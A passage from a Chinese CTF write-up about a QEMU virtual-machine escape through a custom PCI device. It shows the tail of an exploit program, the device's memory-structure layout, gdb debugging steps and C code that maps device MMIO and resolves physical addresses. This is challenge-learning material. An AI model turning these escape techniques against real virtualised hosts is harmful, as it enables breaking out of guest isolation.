        mmio_write(0x20, 0xF62D);
    
    
    
        // uint64_t leak_stdout=*(uint64_t*)userbuf;
        // printf("leaking stdout function: %p\n",(void*)leak_stdout);
    
    
    
        return 0;
    }
    

运行结果（这里如果师傅们想要调试，可能要改下shellcode，因为我的shellcode对应的文件名是flag_5eca9bd3eb07c006cd43ae48dfde7fd3）

![](https://p4.ssl.qhimg.com/t016217bd6ee0ba091d.png)

###  0x03 操作

#####  0.1 进行结构的创建

起初的样子

![](https://p1.ssl.qhimg.com/t01793e017f6f8463bf.png)

![](https://p2.ssl.qhimg.com/t01d1d27aa539c53ae5.png)

可以看到右击之后是有创建结构选项的（或者直接点击convert to struct*）

之后自动弹出了下面的东西

根据我们在local_type里面看到的结构进行修改

    
    
    00000000 FastexecState   struc ; (sizeof=0x100A00, align=0x10, copyof_4530)
    00000000 pdev            PCIDevice_0 ?
    000008F0 mmio            MemoryRegion_0 ?
    000009E0 execed          dq ?
    000009E8 offset          dq ?
    000009F0 size            dq ?
    000009F8 paddr           dq ?
    00000A00 buf             db 1048576 dup(?)
    00100A00 FastexecState   ends
    00100A00
    

修改之后的样子

![](https://p3.ssl.qhimg.com/t01d33475d4402065e1.png)

#####  0.2 调试方法

写这个是怕自己以后又忘了

首先左边 sudo ./launsh.sh启动机器

![](https://p1.ssl.qhimg.com/t01cfc41f29707fda85.png)

右边查看进程的pid

![](https://p2.ssl.qhimg.com/t0110accf2037e2c9bf.png)

之后sudo gdb 进行进程的attach

下断点的方法

![](https://p1.ssl.qhimg.com/t013046581ec81eb5a8.png)

#####  0x03 动态调试的时候看结构

效果图

![](https://p4.ssl.qhimg.com/t0101bce538293a99a1.png)

![](https://p1.ssl.qhimg.com/t018e9ce192ceb7322e.png)

首先我们知道了结构对应的内存地址

![](https://p2.ssl.qhimg.com/t01cd52572d164ecadc.png)

随便瞟一眼

![](https://p1.ssl.qhimg.com/t01fed05679ff4fd7e8.png)

之后根据local_type的结构提示

    
    
    00000000 pdev            PCIDevice_0 ?
    000008F0 mmio            MemoryRegion_0 ?
    

可以这样

![](https://p0.ssl.qhimg.com/t01475f0f008412cb3a.png)

同时还可以发现

![](https://p2.ssl.qhimg.com/t0151cb64a3885ff866.png)

#####  0x04 pym 与 membuffer

用户态操作membuffer，cpu_mem_rw操作pym

一个virtual_mem一个物理地址，对应的同一篇内存

    
    
       int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR);
       if (fd == -1) {
          die("open device error");
       }
       //映射设备内存
       mmio = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);
       if (mmio == MAP_FAILED) {
          die("mmap device memory error");
       }
       /*映射一块缓冲区*/
       buffer = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,-1,0);
       if (buffer == MAP_FAILED) {
          die("mmap local buffer error");
       }
       //必须锁住内存，才能准确获得物理地址
       mlock(buffer, 0x1000);
       //获得buffer的物理映射地址
       buffer_phys_addr = get_phys_addr(buffer);
       printf("buffer_phys_addr=0x%lx\n",buffer_phys_addr);
    

###  0x04 参考

<https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA>

###  0x05 总结

距离上一次qemu逃逸很久了，很多操作不是很熟悉了，重新学习，收获很多

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **‭‭‭‭init-0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/227608](/post/id/227608)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=mFOv1NwnmMMaRPEzzhe16w&s=40&t=1570448917)
‭‭‭‭init-0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

